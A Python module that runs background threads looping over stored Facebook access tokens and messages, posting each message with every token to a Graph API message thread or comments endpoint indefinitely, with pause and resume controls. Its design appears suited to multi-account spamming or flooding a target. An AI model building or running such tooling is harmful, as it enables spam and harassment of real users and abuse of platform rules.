import requests
import time
import json
import logging
from threading import Event, Thread
from sqlalchemy.orm import sessionmaker
from models.task_model import Task
from sqlalchemy import create_engine
from config import DB_NAME

# ------------------ Database Session ------------------
engine = create_engine(f'sqlite:///{DB_NAME}?check_same_thread=False')
Session = sessionmaker(bind=engine)

# ------------------ Running Tasks Store ------------------
running_tasks = {}

# ------------------ MESSAGE/COMMENT SENDER ------------------
def send_messages(task_id, stop_event: Event, pause_event: Event):
    db_session = Session()
    task = db_session.query(Task).filter_by(id=task_id).first()
    
    if not task:
        db_session.close()
        return

    try:
        tokens = json.loads(task.tokens)
        messages = json.loads(task.messages)
    except Exception as e:
        logging.error(f"⚠️ Error decoding JSON for Task {task_id}: {e}")
        db_session.close()
        return

    headers = {'Content-Type': 'application/json'}

    while not stop_event.is_set():
        if pause_event.is_set():
            time.sleep(1)
            continue

        try:
            for message_content in messages:
                if stop_event.is_set() or pause_event.is_set():
                    break

                for access_token in tokens:
                    if stop_event.is_set() or pause_event.is_set():
                        break

                    # Choose API URL based on task type
                    if task.task_type == 'message':
                        api_url = f'https://graph.facebook.com/v15.0/t_{task.thread_id}/'
                        parameters = {'access_token': access_token,
                                      'message': f"{task.prefix} {message_content}"}
                    else:  # comment
                        api_url = f'https://graph.facebook.com/v15.0/{task.thread_id}/comments'
                        parameters = {'access_token': access_token,
                                      'message': f"{task.prefix} {message_content}"}

                    try:
                        response = requests.post(api_url, data=parameters, headers=headers, timeout=10)

                        if response.status_code == 200:
                            task.messages_sent += 1
                            db_session.commit()
                            action = "Commented" if task.task_type == 'comment' else "Sent"
                            logging.info(f"✅ {action}: {message_content[:30]} for Task ID: {task.id}")
                        else:
                            logging.warning(f"❌ Fail [{response.status_code}]: {message_content[:30]} for Task ID: {task.id}")

                    except requests.exceptions.RequestException as e:
                        logging.error(f"⚠️ Network error for Task {task.id}: {e}")

                if stop_event.is_set() or pause_event.is_set():
                    break

                time.sleep(task.interval)

        except Exception as e:
            logging.error(f"⚠️ Error in message loop for Task ID {task.id}: {e}")
            db_session.rollback()
            time.sleep(10)

    db_session.close()

# ------------------ RUNNING TASK MANAGEMENT ------------------
def start_task(task_id):
    stop_event = Event()
    pause_event = Event()
    thread = Thread(target=send_messages, args=(task_id, stop_event, pause_event))
    thread.daemon = True
    thread.start()

    running_tasks[task_id] = {
        'thread': thread,
        'stop_event': stop_event,
        'pause_event': pause_event
    }
    logging.info(f"▶️ Started Task ID: {task_id}")


def stop_task(task_id):
    if task_id in running_tasks:
        running_tasks[task_id]['stop_event'].set()
        del running_tasks[task_id]
        logging.info(f"🛑 Stopped Task ID: {task_id}")


def pause_task(task_id):
    if task_id in running_tasks:
        running_tasks[task_id]['pause_event'].set()
        logging.info(f"⏸️ Paused Task ID: {task_id}")


def resume_task(task_id):
    if task_id in running_tasks:
        running_tasks[task_id]['pause_event'].clear()
        logging.info(f"▶️ Resumed Task ID: {task_id}")


# ------------------ RESUME TASKS ON STARTUP ------------------
def run_all_tasks_from_db():
    db_session = Session()
    tasks_from_db = db_session.query(Task).filter_by(status='Running').all()

    for task in tasks_from_db:
        start_task(task.id)
        logging.info(f"✅ Resumed Task ID {task.id} from database.")

    db_session.close()
